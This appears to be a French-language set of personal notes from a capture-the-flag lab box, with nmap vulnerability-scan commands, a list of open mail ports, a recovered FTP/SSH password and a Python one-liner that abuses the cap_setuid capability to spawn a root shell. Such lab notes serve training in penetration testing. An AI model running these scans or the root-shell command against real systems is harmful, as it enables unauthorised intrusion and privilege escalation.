#ip 10.10.10.245

faille cap_suid

#connection vpn avant chaque box :
-openvpn souley175.ovpn

#lien tuto nmap :
https://oksecu.home.blog/2019/07/11/detecter-facilement-les-cve-avec-les-scripts-nmap/


#mettre / a la fin 
-sudo nmap --script nmap-vulners/ -sV -p 25,110,119,143,465,563,587,993,995 10.10.10.245

-sudo nmap --script nmap-vulners/,vulscan/ -sV -p 25,110,119,143,465,563,587,993,995 10.10.10.245  

nmap macosta :
-sudo nmap --script vuln -sV -p 139,445,3389 -oA nmap/vuln $IP -P

-sudo nmap --script vuln -sV -p 21,22,80,25,110,119,143,465,563,587,993,995 10.10.10.245

lien port ouver a tester :
https://book.hacktricks.xyz/pentesting/pentesting-smtp

liste port ouvet : 
25/tcp  open  smtp
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

lien root :
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

pass ftp : Buck3tH4TF0RM3!

connexion ssh :

ssh nathan@10.10.10.245 

pass ssh : Buck3tH4TF0RM3!

# problèmes de permissions avec gunicorn et les threads. solution de fortune pour le moment.
#os.setuid(0)
#command = f "timeout 5 tcpdump -w {path} -i any host {ip}"

cap ctf lien :
https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities

shell root :
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'